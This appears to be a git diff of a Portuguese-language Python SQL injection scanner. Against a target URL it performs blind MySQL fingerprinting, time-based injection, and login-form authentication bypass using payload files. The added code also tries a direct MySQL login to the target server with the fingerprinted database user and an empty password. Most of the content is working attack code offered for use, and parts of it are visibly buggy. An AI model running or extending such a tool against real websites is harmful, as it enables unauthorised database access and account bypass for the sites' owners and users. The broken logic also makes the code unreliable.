@@ -16,13 +16,14 @@ from unittest import result
 from cherrypy import url
 from pendulum import time
 from pymysql import NULL
+from responses import target
 from sympy import pretty
 
 from core.config import INITIAL_COUNT_VALUE, INITIAL_FORM_COUNT_VALUE
 
 
 
-def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
+def _sqlInjection(target_url, response, cookie):
     try:
         try:
             from core import colors as color
@@ -36,6 +37,8 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
             from mode.plugin.dbfingerprint import _dbFingerprint
             from mode.plugin.dbfingerprint import _serverVersion
             from mode.plugin.dbfingerprint import _getDatabaseNameU
+            from mode.plugin.connection import _connectMYSQL
+            from mode.plugin.connection import _socket
             
             import re
             import requests
@@ -58,9 +61,7 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                     quit()
             else:
                 print("["+color.green+"+"+color.end+"] Conexão estável ")
-                pass
-                print("["+color.green+"+"+color.end+"] Tempo média da requisição [JITTER]: "+color.cian, avaregeTime(target_url), color.end)
-                
+                pass 
             ## filtrando a variável url id do alvo passado
             try:
                 print("["+color.green+"~"+color.end+"] Procurando por variáveis URL...", end='') 
@@ -82,9 +83,21 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                             
                             print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) FINGERPRINT TECHINQUE, pode levar alguns minutos dependendo da Lactência da Rede.."+color.end)
                             server_fingerprint = _serverVersion(target_url, current_table_cullumns_number)
+                            ## veriffica pra caso haja valores no array do fingerprint do servidor
+                            if server_fingerprint:
+                                pass
+                            else:
+                                server_fingerprint[1] = "Não encontrado";
+                                server_fingerprint[2] = "Não encontrado";
+                                
                             
                             print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) DATABASE USER FINGERPRINT TECHINQUE..."+color.end)
                             database_user_fingerprint = _getDatabaseNameU(target_url, current_table_cullumns_number)
+                            if '2' in database_user_fingerprint.keys():
+                                pass
+                            else:
+                                database_user_fingerprint[2] = "Não encontrado"
+                                
                                                        
                             print("["+color.green+"~"+color.end+"] Identificando o SGBD com "+color.cian+" SQLI INFERENCIAL(CEGA)"+color.end)
                             if 'mysql' in requesicao.text.lower():
@@ -105,7 +118,20 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
 #                               print("\tQuantidade de colunas na tabela actual: %s "%current_table_cullumns_number)
                                 print(" ----------")
                                 ## termino do relatório
+                                
+                                database_user_fingerprint[2] = database_user_fingerprint[2].split('@' )
+                                
+                                
+                                
+                                ## tentando connecctar ao banco de dados:
+                                
+                                mysql_server_ip =  _socket(target_url)
+                                conexao = _connectMYSQL(mysql_server_ip, database_user_fingerprint[2][0], '')
+                                ## criar uma condição aqui, pra caso o usuário desejar apenas testar se o alvo é vulnerável ou não
+                                
+                                
                                 print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
+                                
                                 with open('./mode/payload/mysql/blind_payloads_time_based', 'r') as blind_time_based_sqli:
                                     for lines in blind_time_based_sqli:
                                         response_time = int(avaregeTime(exploited_target_url))
@@ -113,7 +139,7 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                             print("["+color.green+"+"+color.end+"] ["+color.green+"Viável"+color.end+"]    MYSQLi"+ color.cian, lines+color.end, end='')
                                         else:
                                             print("["+color.red+"-"+color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi"+ color.cian, lines+color.end, end='')
-                                print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
+                                #print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
         
                             elif 'native client' in requesicao.text.lower():
                                 print("["+color.green+"~"+color.end+"] SGBD identificado: "+color.cian+"[MSSQL]")
@@ -158,8 +184,7 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                     '''
                     Faz o teste sqli nos campos de formulários filtrados 👇👇👇👇👇👇👇👇👇
                     '''
-                    print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" variáveis URL não encontrado( e.x'http://www.site.com/artigo.php?id=1')"+color.end)
-                    print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" Será usada campos inputs..."+color.end)
+                    print("\n"+color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" variáveis URL não encontrado( e.x'http://www.site.com/artigo.php?id=1'). Será usada campos inputs..."+color.end)
                     print("["+color.green+"+"+color.end+"] Procurando por formulários..."+color.end)
                     
                     main_requesition = requests.get(url=target_url)
@@ -184,7 +209,8 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                         
                     print("["+color.green+"+"+color.end+"]"+color.end+" Foi encontrado [0 - %s] formulários." % form_quant, end='')
                     if form_quant == INITIAL_COUNT_VALUE:
-                        form_quant = form_quant
+                        form_quant = 1  
+                        user_option = 0
                     else:
                         try:
                             user_option = int(input(" Qual a posição do formulário que desejas testar?: "))
@@ -195,12 +221,20 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                             print(color.info_1+color.red_0+color.info_2+" Erro: "+color.red+"Quantidade "+color.red+"inválida."+color.end+" Saindo do programa...")
                             quit()
                         else:
-                            for user_option_perc in range(INITIAL_FORM_COUNT_VALUE):
+                            pass
+                    for user_option_perc in range(INITIAL_FORM_COUNT_VALUE):
                                 ## monta a url de validação dos dados
                                 post_target_url = url_exploded[0]+'//'+url_exploded[2]+'/'+validation_page[user_option]
                                 ## avança na execução conforme instruido pelo o usuário
-                                print("["+color.green+"+"+color.end+"]" +color.end+" Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
+                                print("\n["+color.green+"+"+color.end+"]" +color.end+" Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
                                 input_tag = array_form[user_option].find_all({'input'})
+                                ## testa a existencia da interação da página de login, caso não seja passada, solicite que se passe
+                                if response:
+                                    pass
+                                else:
+                                    print(color.info_1+color.red_0+color.info_2+" Erro:"+color.end+color.end+" Não foi passada a mensagem de interação da página via "+color.cian+" --response"+color.end)
+                                    quit()
+                                    
                                 print("["+color.green+"+"+color.end+"] Testando "+color.cian+" Injeção inferencial(CEGA) BYPASS AUTH BOOLEAN "+color.end)
                                 with open ('./mode/payload/bypass_auth_payloads_sqli', 'r') as bypass_auth_payloads_sqli:
                                     for lines in bypass_auth_payloads_sqli:
@@ -211,17 +245,35 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                                 elif 'name' in input_tag_perc.attrs:
                                                     input_dic[input_tag_perc.attrs['name']] = lines
                                         main_requesition = requests.post(url=post_target_url, data=input_dic)
-                                        if 'Set-Cookie' in main_requesition.headers: ## pensar bem nessa línha 
-                                            print("["+color.green+"+"+color.end+"] ["+color.green+"Viável"+color.end+"]    MYSQLi BYPASS AUTH BOOLEAN "+ color.cian, lines+color.end, end='')
-                                            succed_payloads.append(lines)
+                                        '''
+                                        alguns servidores mal configuradas, ou páginas, não enviam o cabeçalho http Set-cookie logo na primeira requisão
+                                        a página de login, só depois de usuário estiver aunteticado, podemos nos aproveitar dessa falha e testarmos a autenti-
+                                        cidade dos payloads
+                                        '''
+                                        if 'Set-Cookie' in main_requesition.headers:
+                                            ## ver bem essa lógica... não funcionando ainda em condições
+                                            if response not in main_requesition.text.lower(): 
+                                                print("["+color.green+"+"+color.end+"] ["+color.green+"Viável"+color.end+"]  MYSQLi BYPASS AUTH BOOLEAN "+ color.cian, lines+color.end, end='')
+                                                succed_payloads.append(lines)
+                                                break
+                                            else:
+                                                print("["+color.red+"-"+color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
                                         else:
-                                            print("["+color.red+"-"+color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
+                                            ## ver bem essa lógica... não funcionando ainda em condições
+                                            if response not in main_requesition.text.lower() and lines not in main_requesition.text.lower():
+                                                print("["+color.green+"+"+color.end+"] ["+color.green+"Viável"+color.end+"]  MYSQLi BYPASS AUTH BOOLEAN "+ color.cian, lines+color.end, end='')
+                                                succed_payloads.append(lines)
+                                                break
+                                            else:
+                                                print("["+color.red+"-"+color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
                                 '''
                                 secção de relatórios de teste
                                 '''          
                                 print("\n O Web spider detetou os seguintes pontos de injeção no alvo:")
                                 for succed_payloads_lines in succed_payloads:
                                     print("\t Título: MYSQLi BYPASS AUTH BOOLEAN :: Payload: %s" %succed_payloads_lines, end='')
+                                    for index, value in input_dic.items():
+                                        print("\t Variávei url: %s"%index)
             except requests.exceptions.RequestException as e:
                 print('\n'+color.info_1+color.red_0+color.info_2+" Erro: "+color.red+"alvo"+color.orange+" Inacessível, verifique a sua ligação à internet ou contacte o"+color.red+" Web master."+color.end)
                 quit()
